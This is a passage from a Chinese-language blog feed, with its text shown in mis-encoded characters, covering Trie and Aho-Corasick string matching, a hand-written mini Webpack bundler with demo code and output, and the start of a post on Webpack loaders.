‘çš„æœ¬è´¨ï¼Œå°±æ˜¯åˆ©ç”¨å­—ç¬¦ä¸²è´¨æ£€çš„å…¬ç”¨å‰ç¼€ï¼Œå°†é‡å¤çš„å‰ç¼€åˆå¹¶åœ¨ä¸€èµ·ã€‚<br>Ttieæ ‘ä¸»è¦æœ‰ä¸¤ä¸ªæ“ä½œï¼Œä¸€ä¸ªæ˜¯å°†å­—ç¬¦ä¸²é›†åˆæ„é€ æˆTrieæ•°ã€‚å¦ä¸€ä¸ªæ˜¯åœ¨Trieæ ‘ç§æŸ¥è¯¢ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><p>å®é™…ä¸ŠTrieåªæ˜¯ä¸é€‚åˆç²¾ç¡®åŒ¹é…æŸ¥æ‰¾ï¼Œæ¯”è¾ƒé€‚åˆçš„æ˜¯æŸ¥æ‰¾å‰ç¼€åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚Trieæ•°å¯ä»¥åº”ç”¨åˆ°è‡ªåŠ¨è¾“å…¥è¡¥å…¨ï¼Œæ¯”å¦‚è¾“å…¥æ³•è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½ï¼ŒIDEä»£ç ç¼–è¾‘å™¨è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½ï¼Œæµè§ˆå™¨ç½‘å€è¾“å…¥çš„è‡ªåŠ¨è¡¥å…¨ã€‚</p><h3 id="6-ACè‡ªåŠ¨æœº"><a href="#6-ACè‡ªåŠ¨æœº" class="headerlink" title="6. ACè‡ªåŠ¨æœº"></a>6. ACè‡ªåŠ¨æœº</h3><p>å¾ˆå¤šæ”¯æŒç”¨æˆ·å‘è¡¨æ–‡æœ¬å†…å®¹çš„ç½‘ç«™ï¼Œå¦‚BBSï¼Œå¤§éƒ½æœ‰æ•æ„Ÿè¯è¿‡æ»¤åŠŸèƒ½ï¼Œç”¨æ¥è¿‡æ»¤æ‰ç”¨æˆ·è¾“å…¥çš„ä¸€äº›å†…å®¹ã€‚é€šè¿‡ç»´æŠ¤ä¸€ä¸ªæ•æ„Ÿè¯çš„å­—å…¸ï¼Œå½“ç”¨æˆ·è¾“å…¥ä¸€æ®µæ–‡å­—å†…å®¹åï¼Œé€šè¿‡å­—ç¬¦ä¸²åŒ¹é…ç®—æ³•ï¼Œæ¥æŸ¥æ‰¾ç”¨æˆ·è¾“å…¥çš„è¿™æ®µæ–‡å­—ï¼Œæ˜¯å¦åŒ…å«æ•æ„Ÿè¯ï¼Œå¦‚æœæœ‰ï¼Œå°±ç”¨<code>***</code>æ›¿ä»£æ‰ã€‚</p><p>å¤šæ¨¡å¼ä¸²åŒ¹é…ç®—æ³•ï¼Œå°±æ˜¯åœ¨å¤šä¸ªæ¨¡å¼ä¸²å’Œä¸€ä¸ªä¸»ä¸²ä¹‹é—´åšåŒ¹é…ï¼Œä¹Ÿå°±æ˜¯åœ¨ä¸€ä¸ªä¸»ä¸²ä¸­æŸ¥æ‰¾å¤šä¸ªæ¨¡å¼ä¸²ã€‚</p><ul><li><a href="https://mp.weixin.qq.com/s/67uf7pRxXh7Iwm7MMpqJoA" target="_blank" rel="noopener">ä»€ä¹ˆæ˜¯å­—ç¬¦ä¸²åŒ¹é…ç®—æ³•ï¼Ÿ</a></li><li><a href="https://juejin.im/post/5a30c011f265da43333e63b9" target="_blank" rel="noopener">ä¸€ä¸ªéœ€æ±‚å¼•å‘çš„ç®—æ³•åŠä¼˜åŒ–(KMPç®—æ³•)</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>å®˜æ–¹æ•™ä½ æ‰‹å†™ä¸€ä¸ª100è¡Œä»£ç çš„Webpack</title>
      <link href="/2021/12/22/webpack%E6%89%8B%E5%86%99/"/>
      <url>/2021/12/22/webpack%E6%89%8B%E5%86%99/</url>
      <content type="html"><![CDATA[<blockquote><p>Webpackå¦‚ä½•å®ç°æ‰“åŒ…åŠŸèƒ½ï¼Ÿ<br>æœ€è¿‘çœ‹æ–‡ç« åˆ·åˆ°è¿™ä¸ª<a href="https://www.youtube.com/watch?v=Gc9-7PBqOC8&amp;list=LLHK1mTHpwrUeYgF5gu-Kd4g" target="_blank" rel="noopener">å®˜æ–¹æ•™å­¦è§†é¢‘</a>ï¼Œ666å•Šï¼Œå»ºè®®å…ˆè¿›å»çœ‹ä¸€çœ‹ï¼</p></blockquote><p><br></p><h3 id="1-æ‰“åŒ…æ–‡ä»¶åˆ†æ"><a href="#1-æ‰“åŒ…æ–‡ä»¶åˆ†æ" class="headerlink" title="1. æ‰“åŒ…æ–‡ä»¶åˆ†æ"></a>1. æ‰“åŒ…æ–‡ä»¶åˆ†æ</h3><p>é¦–å…ˆwebpackæ„å»ºå‡ºçš„<code>bundle.js</code>é•¿è¿™æ ·ã€‚æ•´ä¸ªä»£ç æ˜¯ä¸€ä¸ªè‡ªæ‰§è¡Œå‡½æ•°ï¼Œå‡½æ•°æ¥æ”¶çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„æ¯ä¸€é¡¹æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œå®ƒä»¬ä¹Ÿè¢«ä¸€ä¸ªå‡½æ•°åŒ…è£¹èµ·æ¥ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">modules</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// æ¨¡æ‹Ÿrequireè¯­å¥</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_webpack_require__</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// æ‰§è¡Œå­˜æ”¾æ‰€æœ‰æ¨¡å—æ•°ç»„ä¸­çš„ç¬¬0ä¸ªæ¨¡å—</span></span><br><span class="line">  _webpack_require__[<span class="number">0</span>]</span><br><span class="line">&#125;)([<span class="comment">/* å­˜æ”¾æ‰€æœ‰æ¨¡å—çš„æ•°ç»„ */</span>module0, module1])</span><br></pre></td></tr></table></figure></p><p>webpackå¦‚ä½•å¤„ç†<code>import</code>å’Œ<code>require</code>?<br>bundle.jsèƒ½ç›´æ¥è¿è¡Œåœ¨æµè§ˆå™¨ä¸­çš„åŸå› åœ¨äºè¾“å‡ºçš„æ–‡ä»¶ä¸­å®šä¹‰äº†ä¸€ä¸ª<code>_webpack_require__</code>å‡½æ•°ï¼Œæ¥æ¨¡æ‹ŸNode.js.ä¸­çš„<code>require</code>è¯­å¥</p><p><br></p><h3 id="2-å®ç°ä¸€ä¸ªç®€å•çš„webpack"><a href="#2-å®ç°ä¸€ä¸ªç®€å•çš„webpack" class="headerlink" title="2. å®ç°ä¸€ä¸ªç®€å•çš„webpack"></a>2. å®ç°ä¸€ä¸ªç®€å•çš„webpack</h3><p>Webpacké€šè¿‡å…¥å£æ–‡ä»¶é€å±‚éå†åˆ°æ¨¡å—ä¾èµ–ï¼Œè¿›è¡Œä»£ç åˆ†æï¼Œè½¬æ¢ï¼Œæœ€ç»ˆç”Ÿæˆå¯åœ¨æµè§ˆå™¨è¿è¡Œçš„æ‰“åŒ…åçš„ä»£ç ã€‚</p><ul><li>è§£æå…¥å£æ–‡ä»¶ï¼Œè·å–AST</li><li>ä»ASTä¸­æ‰¾åˆ°importç”Ÿæˆï¼Œæ‰¾å‡ºæ‰€æœ‰ä¾èµ–æ¨¡å—</li><li>ASTè½¬æ¢ä¸ºå¯æ‰§è¡Œçš„code</li><li>é€’å½’ç”Ÿæˆæ‰€æœ‰ä¾èµ–é¡¹ï¼Œç”Ÿæˆä¾èµ–å…³ç³»å›¾</li><li>é‡å†™requireå‡½æ•°ï¼Œè¾“å‡ºbundleï¼ˆä¸€ä¸ªç«‹å³æ‰§è¡Œå‡½æ•°ï¼Œä¸€ä¸ªrequireå‡½æ•°ï¼Œæ‰€æœ‰moduleï¼‰<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> babylon = <span class="built_in">require</span>(<span class="string">'babylon'</span>)</span><br><span class="line"><span class="keyword">const</span> traverse = <span class="built_in">require</span>(<span class="string">'babel-traverse'</span>).default</span><br><span class="line"><span class="keyword">const</span> babel = <span class="built_in">require</span>(<span class="string">'babel-core'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ID = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * è§£ææ–‡ä»¶ï¼Œç”Ÿæˆè¿™ä¸ªæ¨¡å—çš„code, æå–ä¾èµ–</span></span><br><span class="line"><span class="comment"> * accept a path to a file, read its contents, and extract its dependencies</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createAsset</span> (<span class="params">filePath</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// è¯»å–æ–‡ä»¶ï¼Œç”Ÿæˆast</span></span><br><span class="line">  <span class="keyword">const</span> content = fs.readFileSync(filePath, <span class="string">'utf-8'</span>)</span><br><span class="line">  <span class="keyword">const</span> ast = babylon.parse(content, &#123;</span><br><span class="line">    sourceType: <span class="string">'module'</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è¯»å–ä»£ç ä¸­çš„importå£°æ˜ï¼Œè·å–è¿™ä¸ªæ¨¡å—çš„ä¾èµ–æ¨¡å—</span></span><br><span class="line">  <span class="keyword">const</span> dependencies = []</span><br><span class="line">  traverse(ast, &#123;</span><br><span class="line">    ImportDeclaration: <span class="function">(<span class="params">&#123; node &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">      dependencies.push(node.source.value)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å°†æ¨¡å—ä»£ç ç”¨babel-preset-envè½¬ä¸€ä¸‹</span></span><br><span class="line">  <span class="keyword">const</span> id = ID++</span><br><span class="line">  <span class="keyword">const</span> &#123; code &#125; = babel.transformFromAst(ast, <span class="literal">null</span>, &#123;</span><br><span class="line">    presets: [<span class="string">'env'</span>]</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    id, <span class="comment">// moduleId</span></span><br><span class="line">    filePath, <span class="comment">// filePath</span></span><br><span class="line">    dependencies, <span class="comment">// æ¨¡å—ä¾èµ–çš„æ¨¡å—</span></span><br><span class="line">    code <span class="comment">// æ¨¡å—ä»£ç </span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ä»å…¥å£æ–‡ä»¶ï¼Œé€’å½’ç”Ÿæˆæ‰€æœ‰ä¾èµ–</span></span><br><span class="line"><span class="comment"> * Now that we can extract the dependencies of a single module, we are going to</span></span><br><span class="line"><span class="comment"> * start by extracting the dependencies of the entry file.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createGraph</span> (<span class="params">entry</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// entry: the main file of our application</span></span><br><span class="line">  <span class="keyword">const</span> mainAsset = createAsset(entry)</span><br><span class="line">  <span class="keyword">const</span> queue = [mainAsset]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> asset <span class="keyword">of</span> queue) &#123;</span><br><span class="line">    <span class="keyword">const</span> dirname = path.dirname(asset.filePath)</span><br><span class="line"></span><br><span class="line">    asset.mapping = &#123;&#125;</span><br><span class="line">    asset.dependencies.forEach(<span class="function"><span class="params">relativePath</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> absolutePath = path.join(dirname, relativePath)</span><br><span class="line">      <span class="keyword">const</span> child = createAsset(absolutePath)</span><br><span class="line">      asset.mapping[relativePath] = child.id</span><br><span class="line">      queue.push(child)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> queue</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ç”Ÿæˆbundle.jsçš„code</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bundle</span> (<span class="params">graph</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> modules = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ä¼ é€moduleï¼Œä½¿ç”¨äº†CommonJSçš„æ¨¡å—æ ‡å‡†ï¼Œä»–ä»¬éœ€è¦require, module, exportsè¿™3ä¸ªå¯ç”¨çš„æ–¹æ³•</span></span><br><span class="line">  <span class="comment">// å› ä¸ºæµè§ˆå™¨ä¸æ”¯æŒï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šè‡ªå·±å®ç°å®ƒ</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// the code of each module wrapped with a function</span></span><br><span class="line">  <span class="comment">// This is because modules should be scoped</span></span><br><span class="line">  <span class="comment">// Defining a variable in on module shouldn't affect others of the global scope</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// When we transpile our modules, use the CommonJS module system</span></span><br><span class="line">  <span class="comment">// They expect a `require`, a `module` and an `exports` objects to be available</span></span><br><span class="line">  <span class="comment">// Those are not normally available in the browser </span></span><br><span class="line">  <span class="comment">// so we will implement them and inject them into our function wrappers</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// For the second value, we stringify the mapping between a module and its dependencies. </span></span><br><span class="line">  <span class="comment">// This is an object that looks like this:</span></span><br><span class="line">  <span class="comment">// &#123; './relative/path': 1 &#125;</span></span><br><span class="line">  graph.forEach(<span class="function"><span class="params">mod</span> =&gt;</span> &#123;</span><br><span class="line">    modules += <span class="string">`<span class="subst">$&#123;mod.id&#125;</span>: [</span></span><br><span class="line"><span class="string">      function (require, module, exports) &#123;</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;mod.code&#125;</span></span></span><br><span class="line"><span class="string">      &#125;,</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(mod.mapping)&#125;</span></span></span><br><span class="line"><span class="string">    ],`</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç«‹å³æ‰§è¡Œå‡½æ•°</span></span><br><span class="line">  <span class="comment">// å®šä¹‰`require()`</span></span><br><span class="line">  <span class="keyword">const</span> result = <span class="string">`</span></span><br><span class="line"><span class="string">    (function (modules) &#123;</span></span><br><span class="line"><span class="string">      function require(id) &#123;</span></span><br><span class="line"><span class="string">        const [fn, mapping] = modules[id]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        function localRequire (relativePath) &#123;</span></span><br><span class="line"><span class="string">          return require(mapping[relativePath])</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        const module = &#123; exports: &#123;&#125; &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        fn(localRequire, module, module.exports)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        return module.exports</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      require(0)</span></span><br><span class="line"><span class="string">    &#125;)(&#123;<span class="subst">$&#123;modules&#125;</span>&#125;)</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> graph = createGraph(<span class="string">'./entry.js'</span>)</span><br><span class="line"><span class="keyword">const</span> result = bundle(graph)</span><br><span class="line"><span class="built_in">console</span>.log(result)</span><br></pre></td></tr></table></figure></li></ul><p>æˆ‘ä»¬å†™ä¸€ä¸ªdemoï¼Œæ‰§è¡Œ<code>node bundle.js</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// entry.js</span></span><br><span class="line"><span class="keyword">import</span> message <span class="keyword">from</span> <span class="string">'./message.js'</span></span><br><span class="line"><span class="built_in">console</span>.log(message)</span><br><span class="line"></span><br><span class="line"><span class="comment">// message.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; name &#125; <span class="keyword">from</span> <span class="string">'./name.js'</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="string">`hello <span class="subst">$&#123;name&#125;</span>`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// name.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> name = <span class="string">'123'</span></span><br></pre></td></tr></table></figure></p><p>è¾“å‡ºçš„resultï¼ŒæŠŠä»£ç æ”¾åˆ°æµè§ˆå™¨æ§åˆ¶å°ï¼Œæ‰§è¡Œåè¾“å‡º<code>hello 123</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">modules</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">require</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> [fn, mapping] = modules[id]</span><br><span class="line"></span><br><span class="line">    <span class="comment">// lcoalRequire(relativePath) = require(moduleId)</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">localRequire</span> (<span class="params">relativePath</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">require</span>(mapping[relativePath])</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰module, moduleExportï¼Œæ‰§è¡Œæ¨¡å—å†…çš„ä»£ç ï¼Œè¿”å›module.exports</span></span><br><span class="line">    <span class="comment">// å› æ­¤ require(id) è¿”å›å€¼æ˜¯æ¨¡å—çš„module.exports</span></span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">module</span> = &#123; <span class="attr">exports</span>: &#123;&#125; &#125;</span><br><span class="line">    fn(localRequire, <span class="built_in">module</span>, <span class="built_in">module</span>.exports)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">module</span>.exports</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">require</span>(<span class="number">0</span>)</span><br><span class="line">&#125;)(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="number">0</span>: [</span><br><span class="line">      <span class="function"><span class="keyword">function</span> (<span class="params">require, module, exports</span>) </span>&#123;</span><br><span class="line"><span class="meta">        "use strict"</span>;</span><br><span class="line">        <span class="keyword">var</span> _message = <span class="built_in">require</span>(<span class="string">"./message.js"</span>);</span><br><span class="line">        <span class="keyword">var</span> _message2 = _interopRequireDefault(_message);</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_interopRequireDefault</span>(<span class="params">obj</span>) </span>&#123; </span><br><span class="line">          <span class="keyword">return</span> obj &amp;&amp; obj.__esModule ? obj : &#123; <span class="attr">default</span>: obj &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(_message2.default);</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;<span class="string">"./message.js"</span>:<span class="number">1</span>&#125;</span><br><span class="line">    ],</span><br><span class="line">  <span class="number">1</span>: [</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params">require, module, exports</span>) </span>&#123;</span><br><span class="line"><span class="meta">      "use strict"</span>;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">Object</span>.defineProperty(exports, <span class="string">"__esModule"</span>, &#123;</span><br><span class="line">        value: <span class="literal">true</span></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> _name = <span class="built_in">require</span>(<span class="string">"./name.js"</span>);</span><br><span class="line">      exports.default = <span class="string">"hello "</span> + _name.name;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;<span class="string">"./name.js"</span>:<span class="number">2</span>&#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="number">2</span>: [</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params">require, module, exports</span>) </span>&#123;</span><br><span class="line"><span class="meta">      "use strict"</span>;</span><br><span class="line">      <span class="built_in">Object</span>.defineProperty(exports, <span class="string">"__esModule"</span>, &#123;</span><br><span class="line">        value: <span class="literal">true</span></span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="keyword">var</span> name = exports.name = <span class="string">'111'</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;&#125;</span><br><span class="line">  ],</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.youtube.com/watch?v=Gc9-7PBqOC8&amp;list=LLHK1mTHpwrUeYgF5gu-Kd4g" target="_blank" rel="noopener">å®˜æ–¹è§†é¢‘</a></li><li><a href="https://github.com/ronami/minipack/blob/master/src/minipack.js" target="_blank" rel="noopener">ä»£ç ä»“åº“</a></li><li><a href="https://imweb.io/topic/5a4cce35a192c3b460fce39b" target="_blank" rel="noopener">WebpackåŸç†-è¾“å‡ºæ–‡ä»¶åˆ†æ</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Webpack Loaderçš„è¾“å…¥è¾“å‡ºæ˜¯ä»€ä¹ˆï¼Ÿ</title>
      <link href="/2021/12/05/Webpack-loader/"/>
      <url>/2021/12/05/Webpack-loader/</url>
      <content type="html"><![CDATA[<p>åœ¨Webpackä¸­ï¼Œå¯ä»¥æŠŠloaderçœ‹ä½œä¸€ä¸ªæ•°æ®ç®¡é“ï¼Œè¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€… <code>Buffer</code>ï¼Œç„¶åç»è¿‡åŠ å·¥ï¼Œè¾“å‡ºå¦ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚å¤šä¸ªloaderå¯ä»¥åƒæ°´ç®¡ä¸€æ ·ä¸²è”èµ·æ¥ã€‚</p><p>Loader ç”¨äºå¤„ç†ä»»æ„ç±»å‹çš„æ–‡ä»¶ï¼Œå¹¶ä¸”å°†å®ƒä»¬è½¬æ¢æˆä¸€ä¸ªè®© Webpack å¯ä»¥å¤„ç†çš„æœ‰æ•ˆæ¨¡å—ï¼Œåœ¨ Webpack æ‰“åŒ…ä¹‹å‰æ‰§è¡Œã€‚</p><p>Loaderçš„ä¸€äº›ç‰¹ç‚¹ï¼š</p><ul><li><code>Loader</code> æ˜¯ä¸€ä¸ª <code>node</code> æ¨¡å—ï¼›</li><li><code>Loader</code> å¯ä»¥å¤„ç†ä»»æ„ç±»å‹çš„æ–‡ä»¶ï¼Œè½¬æ¢æˆ <code>webpack</code> å¯ä»¥å¤„ç†çš„æ¨¡å—ï¼›</li><li><code>Loader</code> å¯ä»¥åœ¨ <code>webpack.config.js</code> é‡Œé…ç½®ï¼Œä¹Ÿå¯ä»¥åœ¨ <code>require</code> è¯­å¥é‡Œå†…è”ï¼›</li><li><code>Loader</code> æ ¹æ®é…ç½®ä»å³å‘å·¦é“¾å¼æ‰§è¡Œï¼›</li><li><code>Loader</code> æ¥å—æºæ–‡ä»¶å†…å®¹å­—ç¬¦ä¸²æˆ–è€… <code>Buffer</code>ï¼›</li><li><code>Loader</code> åˆ†ä¸ºå¤šç§ç±»å‹ï¼šåŒæ­¥ã€å¼‚æ­¥å’Œ <code>pitching</code>ï¼Œä»–ä»¬çš„æ‰§è¡Œæµç¨‹ä¸ä¸€æ ·ï¼›</li><li><code>webpack</code> ä¸º <code>Loader</code> æä¾›äº†ä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œæœ‰ä¸€äº› <code>api</code> å¯ä»¥ä½¿ç”¨ï¼›</li></ul><p><br></p><h3 id="1-æœ€ç®€å•çš„loader"><a href="#1-æœ€ç®€å•çš„loader" class="headerlink" title="1. æœ€ç®€å•çš„loader"></a>1. æœ€ç®€å•çš„loader</h3><p>æœ€ç®€å•çš„loaderæ˜¯ä¸€ä¸ªä»€ä¹ˆéƒ½ä¸åšï¼ŒåŸæ ·è¿”å›JSä»£ç çš„ loader<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">source</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> source</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-babel-loader"><a href="#2-babel-loader" class="headerlink" title="2. babel-loader"></a>2. babel-loader</h3><p>æ¥æ”¶<code>source</code>æºç ï¼Œç”¨<code>babel</code>ç¼–è¯‘ä¸€ä¸‹ï¼Œè¿”å›ç¼–è¯‘åçš„ä»£ç ã€‚presets 